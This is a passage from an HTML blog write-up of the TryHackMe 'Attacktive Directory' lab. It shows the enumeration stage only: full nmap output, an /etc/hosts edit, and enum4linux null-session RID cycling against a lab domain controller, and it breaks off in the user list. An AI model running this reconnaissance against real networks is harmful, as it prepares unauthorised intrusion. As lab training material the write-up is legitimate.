@@ -1,0 +1,747 @@
+
+<head>
+    <meta charset="utf-8">
+
+    <title>Attacktive Directory | THM write-up</title>
+
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width,minimum-scale=1,initial-scale=1">
+
+    <link rel="shortcut icon" href="../../favicon.png" type="image/png">
+    <link rel="canonical" href="../index.html">
+    <meta name="referrer" content="no-referrer-when-downgrade">
+    
+    <meta property="og:site_name" content="fr33s0ul">
+    <meta property="og:type" content="article">
+    <meta property="og:title" content="Attacktive Directory | THM write-up">
+    <meta property="og:description" content="Hello world! today's challenge is very unique, we will go through the steps to exploit an active directory. The challenge is designed by a user called Sp00ky. in my opinion, anyone who wants to get close to active directory exploitation this is the one for you, the amount of knowledge">
+    <meta property="og:url" content="https://fr33s0ul.tech/attacktive-directory-thm-write-up/">
+    <meta property="og:image" content="https://fr33s0ul.tech/content/images/size/w1000/2020/04/aD.png">
+    <meta property="article:published_time" content="2020-04-17T14:53:35.000Z">
+    <meta property="article:modified_time" content="2020-04-17T15:00:16.000Z">
+    <meta name="twitter:card" content="summary_large_image">
+    <meta name="twitter:title" content="Attacktive Directory | THM write-up">
+    <meta name="twitter:description" content="Hello world! today's challenge is very unique, we will go through the steps to exploit an active directory. The challenge is designed by a user called Sp00ky. in my opinion, anyone who wants to get close to active directory exploitation this is the one for you, the amount of knowledge">
+    <meta name="twitter:url" content="https://fr33s0ul.tech/attacktive-directory-thm-write-up/">
+    <meta name="twitter:image" content="https://fr33s0ul.tech/content/images/size/w1000/2020/04/aD.png">
+    <meta name="twitter:label1" content="Written by">
+    <meta name="twitter:data1" content="fr33s0ul">
+    <meta name="twitter:site" content="@fr33soul_">
+    <meta name="twitter:creator" content="@fr33soul_">
+    <meta property="og:image:width" content="512">
+    <meta property="og:image:height" content="512">
+    
+    <script type="application/ld+json">
+{
+    "@context": "https://schema.org",
+    "@type": "Article",
+    "publisher": {
+        "@type": "Organization",
+        "name": "fr33s0ul",
+        "url": "https://fr33s0ul.tech/",
+        "logo": {
+            "@type": "ImageObject",
+            "url": {
+                "@type": "ImageObject",
+                "url": "https://fr33s0ul.tech/content/images/size/w1000/2020/03/logo.gif",
+                "width": 300,
+                "height": 41
+            }
+        }
+    },
+    "author": {
+        "@type": "Person",
+        "name": "fr33s0ul",
+        "image": {
+            "@type": "ImageObject",
+            "url": "https://fr33s0ul.tech/content/images/size/w1000/2020/03/asdasd.gif",
+            "width": 600,
+            "height": 594
+        },
+        "url": "https://fr33s0ul.tech/author/fr33s0ul/",
+        "sameAs": [
+            "https://twitter.com/fr33soul_"
+        ]
+    },
+    "headline": "Attacktive Directory | THM write-up",
+    "url": "https://fr33s0ul.tech/attacktive-directory-thm-write-up/",
+    "datePublished": "2020-04-17T14:53:35.000Z",
+    "dateModified": "2020-04-17T15:00:16.000Z",
+    "image": {
+        "@type": "ImageObject",
+        "url": "https://fr33s0ul.tech/content/images/size/w1000/2020/04/aD.png",
+        "width": 512,
+        "height": 512
+    },
+    "description": "Hello world! today&#x27;s challenge is very unique, we will go through the steps to\nexploit an active directory. The challenge is designed by a user called Sp00ky.\nin my opinion, anyone who wants to get close to active directory exploitation\nthis is the one for you, the amount of knowledge you&#x27;ll learn is just amazing,\nbecause Active directories use different protocols. You&#x27;ll learn a lot about\nKerberos and how to crack their hashes, and how to use Impacket Secretsdump to\ndump Domain-Control hashes, ",
+    "mainEntityOfPage": {
+        "@type": "WebPage",
+        "@id": "https://fr33s0ul.tech/"
+    }
+}
+    </script>
+
+    <meta name="generator" content="Ghost 3.13">
+    <link rel="alternate" type="application/rss+xml" title="fr33s0ul" href="../../rss/index.html">
+
+    <link rel="stylesheet" type="text/css" href="https://fonts.googleapis.com/css?family=Merriweather:300,700,700italic,300italic%7COpen+Sans:700,600,400">
+    <style amp-custom>html{font-family:sans-serif;-ms-text-size-adjust:100%;-webkit-text-size-adjust:100%}body{margin:0}article,aside,details,figcaption,figure,footer,header,main,menu,nav,section,summary{display:block}audio,canvas,progress,video{display:inline-block;vertical-align:baseline}audio:not([controls]){display:none;height:0}[hidden],template{display:none}a{background-color:transparent}a:active,a:hover{outline:0}abbr[title]{border-bottom:1px dotted}b,strong{font-weight:bold}dfn{font-style:italic}h1{margin:0.67em 0;font-size:2em}mark{background:#ff0;color:#000}small{font-size:80%}sub,sup{position:relative;vertical-align:baseline;font-size:75%;line-height:0}sup{top:-0.5em}sub{bottom:-0.25em}img{border:0}amp-img{border:0}svg:not(:root){overflow:hidden}figure{margin:1em 40px}hr{box-sizing:content-box;height:0}pre{overflow:auto}code,kbd,pre,samp{font-family:monospace, monospace;font-size:1em}button,input,optgroup,select,textarea{margin:0;color:inherit;font:inherit}button{overflow:visible}button,select{text-transform:none}button,html input[type="button"],input[type="reset"],input[type="submit"]{cursor:pointer;-webkit-appearance:button}button[disabled],html input[disabled]{cursor:default}button::-moz-focus-inner,input::-moz-focus-inner{padding:0;border:0}input{line-height:normal}input[type="checkbox"],input[type="radio"]{box-sizing:border-box;padding:0}input[type="number"]::-webkit-inner-spin-button,input[type="number"]::-webkit-outer-spin-button{height:auto}input[type="search"]{-webkit-appearance:textfield}input[type="search"]::-webkit-search-cancel-button,input[type="search"]::-webkit-search-decoration{-webkit-appearance:none}fieldset{margin:0 2px;padding:0.35em 0.625em 0.75em;border:1px solid #c0c0c0}legend{padding:0;border:0}textarea{overflow:auto}optgroup{font-weight:bold}table{border-spacing:0;border-collapse:collapse}td,th{padding:0}html{max-height:100%;height:100%;font-size:62.5%;-webkit-tap-highlight-color:rgba(0, 0, 0, 0)}body{max-height:100%;height:100%;color:#3a4145;background:#f4f8fb;letter-spacing:0.01rem;font-family:"Merriweather", serif;font-size:1.8rem;line-height:1.75em;text-rendering:geometricPrecision;-webkit-font-feature-settings:"kern" 1;-moz-font-feature-settings:"kern" 1;-o-font-feature-settings:"kern" 1}::-moz-selection{background:#d6edff}::selection{background:#d6edff}h1,h2,h3,h4,h5,h6{margin:0 0 0.3em 0;color:#2e2e2e;font-family:"Open Sans", sans-serif;line-height:1.15em;text-rendering:geometricPrecision;-webkit-font-feature-settings:"dlig" 1, "liga" 1, "lnum" 1, "kern" 1;-moz-font-feature-settings:"dlig" 1, "liga" 1, "lnum" 1, "kern" 1;-o-font-feature-settings:"dlig" 1, "liga" 1, "lnum" 1, "kern" 1}h1{text-indent:-2px;letter-spacing:-1px;font-size:2.6rem}h2{letter-spacing:0;font-size:2.4rem}h3{letter-spacing:-0.6px;font-size:2.1rem}h4{font-size:1.9rem}h5{font-size:1.8rem}h6{font-size:1.8rem}a{color:#4a4a4a}a:hover{color:#111}p,ul,ol,dl{margin:0 0 2.5rem 0;font-size:1.5rem;text-rendering:geometricPrecision;-webkit-font-feature-settings:"liga" 1, "onum" 1, "kern" 1;-moz-font-feature-settings:"liga" 1, "onum" 1, "kern" 1;-o-font-feature-settings:"liga" 1, "onum" 1, "kern" 1}ol,ul{padding-left:2em}ol ol,ul ul,ul ol,ol ul{margin:0 0 0.4em 0;padding-left:2em}dl dt{float:left;clear:left;overflow:hidden;margin-bottom:1em;width:180px;text-align:right;text-overflow:ellipsis;white-space:nowrap;font-weight:700}dl dd{margin-bottom:1em;margin-left:200px}li{margin:0.4em 0}li li{margin:0}hr{display:block;margin:1.75em 0;padding:0;height:1px;border:0;border-top:#efefef 1px solid}blockquote{box-sizing:border-box;margin:1.75em 0 1.75em 0;padding:0 0 0 1.75em;border-left:#4a4a4a 0.4em solid;-moz-box-sizing:border-box}blockquote p{margin:0.8em 0;font-style:italic}blockquote small{display:inline-block;margin:0.8em 0 0.8em 1.5em;color:#ccc;font-size:0.9em}blockquote small:before{content:"\2014 \00A0"}blockquote cite{font-weight:700}blockquote cite a{font-weight:normal}mark{background-color:#fdffb6}code,tt{padding:1px 3px;border:#e3edf3 1px solid;background:#f7fafb;border-radius:2px;white-space:pre-wrap;font-family:Inconsolata, monospace, sans-serif;font-size:0.85em;font-feature-settings:"liga" 0;-webkit-font-feature-settings:"liga" 0;-moz-font-feature-settings:"liga" 0}pre{overflow:auto;box-sizing:border-box;margin:0 0 1.75em 0;padding:10px;width:100%;border:#e3edf3 1px solid;background:#f7fafb;border-radius:3px;white-space:pre;font-family:Inconsolata, monospace, sans-serif;font-size:0.9em;-moz-box-sizing:border-box}pre code,pre tt{padding:0;border:none;background:transparent;white-space:pre-wrap;font-size:inherit}kbd{display:inline-block;margin-bottom:0.4em;padding:1px 8px;border:#ccc 1px solid;background:#f4f4f4;border-radius:4px;box-shadow:0 1px 0 rgba(0, 0, 0, 0.2), 0 1px 0 0 #fff inset;color:#666;text-shadow:#fff 0 1px 0;font-size:0.9em;font-weight:700}table{box-sizing:border-box;margin:1.75em 0;max-width:100%;width:100%;background-color:transparent;-moz-box-sizing:border-box}table th,table td{padding:8px;border-top:#efefef 1px solid;vertical-align:top;text-align:left;line-height:20px}table th{color:#000}table caption + thead tr:first-child th,table caption + thead tr:first-child td,table colgroup + thead tr:first-child th,table colgroup + thead tr:first-child td,table thead:first-child tr:first-child th,table thead:first-child tr:first-child td{border-top:0}table tbody + tbody{border-top:#efefef 2px solid}table table table{background-color:#fff}table tbody > tr:nth-child(odd) > td,table tbody > tr:nth-child(odd) > th{background-color:#f6f6f6}table.plain tbody > tr:nth-child(odd) > td,table.plain tbody > tr:nth-child(odd) > th{background:transparent}iframe,amp-iframe,.fluid-width-video-wrapper{display:block;margin:1.75em 0}.fluid-width-video-wrapper iframe,.fluid-width-video-wrapper amp-iframe{margin:0}textarea,select,input{margin:0 0 5px 0;padding:6px 9px;width:260px;outline:0;border:#e7eef2 1px solid;background:#fff;border-radius:4px;box-shadow:none;font-family:"Open Sans", sans-serif;font-size:1.6rem;line-height:1.4em;font-weight:100;-webkit-appearance:none}textarea{min-width:250px;min-height:80px;max-width:340px;width:100%;height:auto}input[type="text"]:focus,input[type="email"]:focus,input[type="search"]:focus,input[type="tel"]:focus,input[type="url"]:focus,input[type="password"]:focus,input[type="number"]:focus,input[type="date"]:focus,input[type="month"]:focus,input[type="week"]:focus,input[type="time"]:focus,input[type="datetime"]:focus,input[type="datetime-local"]:focus,textarea:focus{outline:none;outline-width:0;border:#bbc7cc 1px solid;background:#fff}select{width:270px;height:30px;line-height:30px}.clearfix:before,.clearfix:after{content:" ";display:table}.clearfix:after{clear:both}.clearfix{zoom:1}.main-header{position:relative;display:table;overflow:hidden;box-sizing:border-box;width:100%;height:50px;background:#5ba4e5 no-repeat center center;background-size:cover;text-align:left;-webkit-box-sizing:border-box;-moz-box-sizing:border-box}.content{background:#fff;padding-top:15px}.blog-title,.content{margin:auto;max-width:600px}.blog-title a{display:block;padding-right:16px;padding-left:16px;height:50px;color:#fff;text-decoration:none;font-family:"Open Sans", sans-serif;font-size:16px;line-height:50px;font-weight:600}.post{position:relative;margin-top:0;margin-right:16px;margin-left:16px;padding-bottom:0;max-width:100%;border-bottom:#ebf2f6 1px solid;word-wrap:break-word;font-size:0.95em;line-height:1.65em}.post-header{margin-bottom:1rem}.post-title{margin-bottom:0}.post-title a{text-decoration:none}.post-meta{display:block;margin:3px 0 0 0;color:#9eabb3;font-family:"Open Sans", sans-serif;font-size:1.3rem;line-height:2.2rem}.post-meta a{color:#9eabb3;text-decoration:none}.post-meta a:hover{text-decoration:underline}.post-meta .author{margin:0;font-size:1.3rem;line-height:1.3em}.post-date{display:inline-block;text-transform:uppercase;white-space:nowrap;font-size:1.2rem;line-height:1.2em}.post-image{margin:0;padding-top:3rem;padding-bottom:30px;border-top:1px #E8E8E8 solid}.post-content amp-img,.post-content amp-anim{position:relative;left:50%;display:block;padding:0;min-width:0;max-width:112%;width:calc(100% + 32px);height:auto;transform:translateX(-50%);-webkit-transform:translateX(-50%);-ms-transform:translateX(-50%)}.footnotes{font-size:1.3rem;line-height:1.6em;font-style:italic}.footnotes li{margin:0.6rem 0}.footnotes p{margin:0}.footnotes p a:last-child{text-decoration:none}.site-footer{position:relative;margin:0 auto 20px auto;padding:1rem 15px;max-width:600px;color:rgba(0,0,0,0.5);font-family:"Open Sans", sans-serif;font-size:1.1rem;line-height:1.75em}.site-footer a{color:rgba(0,0,0,0.5);text-decoration:none;font-weight:bold}.site-footer a:hover{border-bottom:#bbc7cc 1px solid}.poweredby{display:block;float:right;width:45%;text-align:right}.copyright{display:block;float:left;width:45%}</style>
+
+    <style amp-boilerplate>body{-webkit-animation:-amp-start 8s steps(1,end) 0s 1 normal both;-moz-animation:-amp-start 8s steps(1,end) 0s 1 normal both;-ms-animation:-amp-start 8s steps(1,end) 0s 1 normal both;animation:-amp-start 8s steps(1,end) 0s 1 normal both}@-webkit-keyframes -amp-start{from{visibility:hidden}to{visibility:visible}}@-moz-keyframes -amp-start{from{visibility:hidden}to{visibility:visible}}@-ms-keyframes -amp-start{from{visibility:hidden}to{visibility:visible}}@-o-keyframes -amp-start{from{visibility:hidden}to{visibility:visible}}@keyframes -amp-start{from{visibility:hidden}to{visibility:visible}}</style><noscript><style amp-boilerplate>body{-webkit-animation:none;-moz-animation:none;-ms-animation:none;animation:none}</style></noscript>
+    <script async src="https://cdn.ampproject.org/v0.js"></script>
+
+    <script async custom-element="amp-iframe" src="https://cdn.ampproject.org/v0/amp-iframe-0.1.js"></script>
+
+</head>
+
+<body class="amp-template">
+    <header class="main-header">
+        <nav class="blog-title">
+            <a href="../../">fr33s0ul</a>
+        </nav>
+    </header>
+
+    <main class="content" role="main">
+        <article class="post">
+
+            <header class="post-header">
+                <h1 class="post-title">Attacktive Directory | THM write-up</h1>
+                <section class="post-meta">
+                    <p class="author">by <a href="../../author/fr33s0ul/">fr33s0ul</a></p>
+                    <time class="post-date" datetime="2020-04-17">2020-04-17</time>
+                </section>
+            </header>
+            <figure class="post-image">
+                <amp-img src="https://fr33s0ul.tech/content/images/size/w1000/2020/04/aD.png" width="600" height="400" layout="responsive"></amp-img>
+            </figure>
+            <section class="post-content">
+
+                <p>Hello world! today's challenge is very unique, we will go through the steps to exploit an active directory. The challenge is designed by a user called <strong>Sp00ky</strong>.<br>in my opinion, anyone who wants to get close to active directory exploitation this is the one for you, the amount of knowledge you'll learn is just amazing, because Active directories use different protocols. You'll learn a lot about Kerberos and how to crack their hashes, and how to use Impacket Secretsdump to dump Domain-Control hashes, and how to access the machine with only NTLM hash with Evil-WinRM ...</p><blockquote>Enumeration</blockquote><pre><code>root@kali:~# nmap -p- -A -nP 10.10.203.152
+Starting Nmap 7.80 ( https://nmap.org ) at 2020-04-17 10:37 UTC
+Nmap scan report for 10.10.203.152
+Host is up (0.00043s latency).
+Not shown: 65508 closed ports
+PORT      STATE SERVICE       VERSION
+53/tcp    open  domain?
+| fingerprint-strings: 
+|   DNSVersionBindReqTCP: 
+|     version
+|_    bind
+80/tcp    open  http          Microsoft IIS httpd 10.0
+| http-methods: 
+|_  Potentially risky methods: TRACE
+|_http-server-header: Microsoft-IIS/10.0
+|_http-title: IIS Windows Server
+88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2020-04-17 10:43:23Z)
+135/tcp   open  msrpc         Microsoft Windows RPC
+139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
+389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: spookysec.local0., Site: Default-First-Site-Name)
+445/tcp   open  microsoft-ds?
+464/tcp   open  kpasswd5?
+593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
+636/tcp   open  tcpwrapped
+3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: spookysec.local0., Site: Default-First-Site-Name)
+3269/tcp  open  tcpwrapped
+3389/tcp  open  ms-wbt-server Microsoft Terminal Services
+| rdp-ntlm-info: 
+|   Target_Name: THM-AD
+|   NetBIOS_Domain_Name: THM-AD
+|   NetBIOS_Computer_Name: ATTACKTIVEDIREC
+|   DNS_Domain_Name: spookysec.local
+|   DNS_Computer_Name: AttacktiveDirectory.spookysec.local
+|   Product_Version: 10.0.17763
+|_  System_Time: 2020-04-17T10:45:49+00:00
+| ssl-cert: Subject: commonName=AttacktiveDirectory.spookysec.local
+| Not valid before: 2020-04-03T18:40:09
+|_Not valid after:  2020-10-03T18:40:09
+|_ssl-date: 2020-04-17T10:46:02+00:00; 0s from scanner time.
+5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
+|_http-server-header: Microsoft-HTTPAPI/2.0
+|_http-title: Not Found
+9389/tcp  open  mc-nmf        .NET Message Framing
+47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
+|_http-server-header: Microsoft-HTTPAPI/2.0
+|_http-title: Not Found
+49664/tcp open  msrpc         Microsoft Windows RPC
+49665/tcp open  msrpc         Microsoft Windows RPC
+49666/tcp open  msrpc         Microsoft Windows RPC
+49667/tcp open  msrpc         Microsoft Windows RPC
+49670/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
+49671/tcp open  msrpc         Microsoft Windows RPC
+49672/tcp open  msrpc         Microsoft Windows RPC
+49673/tcp open  msrpc         Microsoft Windows RPC
+49684/tcp open  msrpc         Microsoft Windows RPC
+49690/tcp open  msrpc         Microsoft Windows RPC
+49789/tcp open  msrpc         Microsoft Windows RPC
+1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
+SF-Port53-TCP:V=7.80%I=7%D=4/17%Time=5E99884F%P=x86_64-pc-linux-gnu%r(DNSV
+SF:ersionBindReqTCP,20,"\0\x1e\0\x06\x81\x04\0\x01\0\0\0\0\0\0\x07version\
+SF:x04bind\0\0\x10\0\x03");
+MAC Address: 02:41:2E:CE:EA:1A (Unknown)
+No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
+TCP/IP fingerprint:
+OS:SCAN(V=7.80%E=4%D=4/17%OT=53%CT=1%CU=44531%PV=Y%DS=1%DC=D%G=Y%M=02412E%T
+OS:M=5E998918%P=x86_64-pc-linux-gnu)SEQ(SP=105%GCD=1%ISR=104%TI=I%CI=I%II=I
+OS:%SS=S%TS=U)OPS(O1=M2301NW8NNS%O2=M2301NW8NNS%O3=M2301NW8%O4=M2301NW8NNS%
+OS:O5=M2301NW8NNS%O6=M2301NNS)WIN(W1=FFFF%W2=FFFF%W3=FFFF%W4=FFFF%W5=FFFF%W
+OS:6=FF70)ECN(R=Y%DF=Y%T=80%W=FFFF%O=M2301NW8NNS%CC=Y%Q=)T1(R=Y%DF=Y%T=80%S
+OS:=O%A=S+%F=AS%RD=0%Q=)T2(R=Y%DF=Y%T=80%W=0%S=Z%A=S%F=AR%O=%RD=0%Q=)T3(R=Y
+OS:%DF=Y%T=80%W=0%S=Z%A=O%F=AR%O=%RD=0%Q=)T4(R=Y%DF=Y%T=80%W=0%S=A%A=O%F=R%
+OS:O=%RD=0%Q=)T5(R=Y%DF=Y%T=80%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=8
+OS:0%W=0%S=A%A=O%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=80%W=0%S=Z%A=S+%F=AR%O=%RD=0%
+OS:Q=)U1(R=Y%DF=N%T=80%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=
+OS:Y%DFI=N%T=80%CD=Z)
+
+Network Distance: 1 hop
+Service Info: Host: ATTACKTIVEDIREC; OS: Windows; CPE: cpe:/o:microsoft:windows
+
+Host script results:
+|_nbstat: NetBIOS name: ATTACKTIVEDIREC, NetBIOS user: &lt;unknown&gt;, NetBIOS MAC: 02:41:2e:ce:ea:1a (unknown)
+| smb2-security-mode: 
+|   2.02: 
+|_    Message signing enabled and required
+| smb2-time: 
+|   date: 2020-04-17T10:45:49
+|_  start_date: N/A
+
+TRACEROUTE
+HOP RTT     ADDRESS
+1   0.43 ms 10.10.203.152
+
+OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 550.50 seconds
+root@kali:~#</code></pre><p>running nmap will help us gather a lot of information about the Active directory and our target in general. for the next step, we will take the DNS domain name and add it to <strong>/etc/hosts</strong> since we are practising in a local area network</p><figure class="kg-card kg-image-card"></figure><pre><code>root@kali:~# echo 10.10.237.175 spookysec.local &gt;&gt; /etc/hosts
+</code></pre><p>The next step, enumerating the two ports used by AD <strong>139</strong> and <strong>445 </strong>with enum4linux the flag -a stands for all simple enumeration, It will gather information for us including (userlist, machine list(s), sharelist, password policy information, group and member list, ...)</p><pre><code>root@kali:~# enum4linux -a spookysec.local
+Starting enum4linux v0.8.9 ( http://labs.portcullis.co.uk/application/enum4linux/ ) on Fri Apr 17 13:15:56 2020
+
+ ========================== 
+|    Target Information    |
+ ========================== 
+Target ........... spookysec.local
+RID Range ........ 500-550,1000-1050
+Username ......... ''
+Password ......... ''
+Known Usernames .. administrator, guest, krbtgt, domain admins, root, bin, none
+
+
+ ======================================================= 
+|    Enumerating Workgroup/Domain on spookysec.local    |
+ ======================================================= 
+[+] Got domain/workgroup name: THM-AD
+
+ =============================================== 
+|    Nbtstat Information for spookysec.local    |
+ =============================================== 
+Looking up status of 10.10.237.175
+        ATTACKTIVEDIREC &lt;00&gt; -         B &lt;ACTIVE&gt;  Workstation Service
+        THM-AD          &lt;00&gt; - &lt;GROUP&gt; B &lt;ACTIVE&gt;  Domain/Workgroup Name
+        THM-AD          &lt;1c&gt; - &lt;GROUP&gt; B &lt;ACTIVE&gt;  Domain Controllers
+        THM-AD          &lt;1b&gt; -         B &lt;ACTIVE&gt;  Domain Master Browser
+        ATTACKTIVEDIREC &lt;20&gt; -         B &lt;ACTIVE&gt;  File Server Service
+
+        MAC Address = 02-4D-80-A3-99-4E
+
+ ======================================== 
+|    Session Check on spookysec.local    |
+ ======================================== 
+[+] Server spookysec.local allows sessions using username '', password ''
+
+ ============================================== 
+|    Getting domain SID for spookysec.local    |
+ ============================================== 
+Domain Name: THM-AD
+Domain Sid: S-1-5-21-3591857110-2884097990-301047963
+[+] Host is part of a domain (not a workgroup)
+
+ ========================================= 
+|    OS information on spookysec.local    |
+ ========================================= 
+Use of uninitialized value $os_info in concatenation (.) or string at ./enum4linux.pl line 464.
+[+] Got OS info for spookysec.local from smbclient: 
+[+] Got OS info for spookysec.local from srvinfo:
+Could not initialise srvsvc. Error was NT_STATUS_ACCESS_DENIED
+
+ ================================ 
+|    Users on spookysec.local    |
+ ================================ 
+[E] Couldn't find users using querydispinfo: NT_STATUS_ACCESS_DENIED
+
+[E] Couldn't find users using enumdomusers: NT_STATUS_ACCESS_DENIED
+
+ ============================================ 
+|    Share Enumeration on spookysec.local    |
+ ============================================ 
+
+        Sharename       Type      Comment
+        ---------       ----      -------
+SMB1 disabled -- no workgroup available
+
+[+] Attempting to map shares on spookysec.local
+
+ ======================================================= 
+|    Password Policy Information for spookysec.local    |
+ ======================================================= 
+[E] Unexpected error from polenum:
+
+
+[+] Attaching to spookysec.local using a NULL share
+
+[+] Trying protocol 139/SMB...
+
+        [!] Protocol failed: Cannot request session (Called Name:SPOOKYSEC.LOCAL)
+
+[+] Trying protocol 445/SMB...
+
+        [!] Protocol failed: SAMR SessionError: code: 0xc0000022 - STATUS_ACCESS_DENIED - {Access Denied} A process has requested access to an object but has not been granted those access rights.
+
+
+[E] Failed to get password policy with rpcclient
+
+
+ ================================= 
+|    Groups on spookysec.local    |
+ ================================= 
+
+[+] Getting builtin groups:
+
+[+] Getting builtin group memberships:
+
+[+] Getting local groups:
+
+[+] Getting local group memberships:
+
+[+] Getting domain groups:
+
+[+] Getting domain group memberships:
+
+ ========================================================================== 
+|    Users on spookysec.local via RID cycling (RIDS: 500-550,1000-1050)    |
+ ========================================================================== 
+[I] Found new SID: S-1-5-21-3591857110-2884097990-301047963
+[I] Found new SID: S-1-5-21-3532885019-1334016158-1514108833
+[+] Enumerating users using SID S-1-5-21-3532885019-1334016158-1514108833 and logon username '', password ''
+S-1-5-21-3532885019-1334016158-1514108833-500 ATTACKTIVEDIREC\Administrator (Local User)
+S-1-5-21-3532885019-1334016158-1514108833-501 ATTACKTIVEDIREC\Guest (Local User)
+S-1-5-21-3532885019-1334016158-1514108833-502 *unknown*\*unknown* (8)
+S-1-5-21-3532885019-1334016158-1514108833-503 ATTACKTIVEDIREC\DefaultAccount (Local User)
+S-1-5-21-3532885019-1334016158-1514108833-504 ATTACKTIVEDIREC\WDAGUtilityAccount (Local User)
+S-1-5-21-3532885019-1334016158-1514108833-505 *unknown*\*unknown* (8)
+S-1-5-21-3532885019-1334016158-1514108833-506 *unknown*\*unknown* (8)
+S-1-5-21-3532885019-1334016158-1514108833-507 *unknown*\*unknown* (8)
+S-1-5-21-3532885019-1334016158-1514108833-508 *unknown*\*unknown* (8)
+S-1-5-21-3532885019-1334016158-1514108833-509 *unknown*\*unknown* (8)
+S-1-5-21-3532885019-1334016158-1514108833-510 *unknown*\*unknown* (8)
+S-1-5-21-3532885019-1334016158-1514108833-511 *unknown*\*unknown* (8)
+S-1-5-21-3532885019-1334016158-1514108833-512 *unknown*\*unknown* (8)
+S-1-5-21-3532885019-1334016158-1514108833-513 ATTACKTIVEDIREC\None (Domain Group)
+S-1-5-21-3532885019-1334016158-1514108833-514 *unknown*\*unknown* (8)
+S-1-5-21-3532885019-1334016158-1514108833-515 *unknown*\*unknown* (8)
+S-1-5-21-3532885019-1334016158-1514108833-516 *unknown*\*unknown* (8)
+S-1-5-21-3532885019-1334016158-1514108833-517 *unknown*\*unknown* (8)
+S-1-5-21-3532885019-1334016158-1514108833-518 *unknown*\*unknown* (8)
+S-1-5-21-3532885019-1334016158-1514108833-519 *unknown*\*unknown* (8)
+S-1-5-21-3532885019-1334016158-1514108833-520 *unknown*\*unknown* (8)
+S-1-5-21-3532885019-1334016158-1514108833-521 *unknown*\*unknown* (8)
+S-1-5-21-3532885019-1334016158-1514108833-522 *unknown*\*unknown* (8)
+S-1-5-21-3532885019-1334016158-1514108833-523 *unknown*\*unknown* (8)
+S-1-5-21-3532885019-1334016158-1514108833-524 *unknown*\*unknown* (8)
+S-1-5-21-3532885019-1334016158-1514108833-525 *unknown*\*unknown* (8)
+S-1-5-21-3532885019-1334016158-1514108833-526 *unknown*\*unknown* (8)
+S-1-5-21-3532885019-1334016158-1514108833-527 *unknown*\*unknown* (8)
+S-1-5-21-3532885019-1334016158-1514108833-528 *unknown*\*unknown* (8)
+S-1-5-21-3532885019-1334016158-1514108833-529 *unknown*\*unknown* (8)
+S-1-5-21-3532885019-1334016158-1514108833-530 *unknown*\*unknown* (8)
+S-1-5-21-3532885019-1334016158-1514108833-531 *unknown*\*unknown* (8)
+S-1-5-21-3532885019-1334016158-1514108833-532 *unknown*\*unknown* (8)
+S-1-5-21-3532885019-1334016158-1514108833-533 *unknown*\*unknown* (8)
+S-1-5-21-3532885019-1334016158-1514108833-534 *unknown*\*unknown* (8)
+S-1-5-21-3532885019-1334016158-1514108833-535 *unknown*\*unknown* (8)
+S-1-5-21-3532885019-1334016158-1514108833-536 *unknown*\*unknown* (8)
+S-1-5-21-3532885019-1334016158-1514108833-537 *unknown*\*unknown* (8)
+S-1-5-21-3532885019-1334016158-1514108833-538 *unknown*\*unknown* (8)
+S-1-5-21-3532885019-1334016158-1514108833-539 *unknown*\*unknown* (8)
+S-1-5-21-3532885019-1334016158-1514108833-540 *unknown*\*unknown* (8)
+S-1-5-21-3532885019-1334016158-1514108833-541 *unknown*\*unknown* (8)
+S-1-5-21-3532885019-1334016158-1514108833-542 *unknown*\*unknown* (8)
+S-1-5-21-3532885019-1334016158-1514108833-543 *unknown*\*unknown* (8)
+S-1-5-21-3532885019-1334016158-1514108833-544 *unknown*\*unknown* (8)
+S-1-5-21-3532885019-1334016158-1514108833-545 *unknown*\*unknown* (8)
+S-1-5-21-3532885019-1334016158-1514108833-546 *unknown*\*unknown* (8)
+S-1-5-21-3532885019-1334016158-1514108833-547 *unknown*\*unknown* (8)
+S-1-5-21-3532885019-1334016158-1514108833-548 *unknown*\*unknown* (8)
+S-1-5-21-3532885019-1334016158-1514108833-549 *unknown*\*unknown* (8)
+S-1-5-21-3532885019-1334016158-1514108833-550 *unknown*\*unknown* (8)
+S-1-5-21-3532885019-1334016158-1514108833-1000 *unknown*\*unknown* (8)
+S-1-5-21-3532885019-1334016158-1514108833-1001 *unknown*\*unknown* (8)
+S-1-5-21-3532885019-1334016158-1514108833-1002 *unknown*\*unknown* (8)
+S-1-5-21-3532885019-1334016158-1514108833-1003 *unknown*\*unknown* (8)
+S-1-5-21-3532885019-1334016158-1514108833-1004 *unknown*\*unknown* (8)
+S-1-5-21-3532885019-1334016158-1514108833-1005 *unknown*\*unknown* (8)
+S-1-5-21-3532885019-1334016158-1514108833-1006 *unknown*\*unknown* (8)
+S-1-5-21-3532885019-1334016158-1514108833-1007 *unknown*\*unknown* (8)
+S-1-5-21-3532885019-1334016158-1514108833-1008 *unknown*\*unknown* (8)
+S-1-5-21-3532885019-1334016158-1514108833-1009 *unknown*\*unknown* (8)
+S-1-5-21-3532885019-1334016158-1514108833-1010 *unknown*\*unknown* (8)
+S-1-5-21-3532885019-1334016158-1514108833-1011 *unknown*\*unknown* (8)
+S-1-5-21-3532885019-1334016158-1514108833-1012 *unknown*\*unknown* (8)
+S-1-5-21-3532885019-1334016158-1514108833-1013 *unknown*\*unknown* (8)
+S-1-5-21-3532885019-1334016158-1514108833-1014 *unknown*\*unknown* (8)
+S-1-5-21-3532885019-1334016158-1514108833-1015 *unknown*\*unknown* (8)
+S-1-5-21-3532885019-1334016158-1514108833-1016 *unknown*\*unknown* (8)
+S-1-5-21-3532885019-1334016158-1514108833-1017 *unknown*\*unknown* (8)
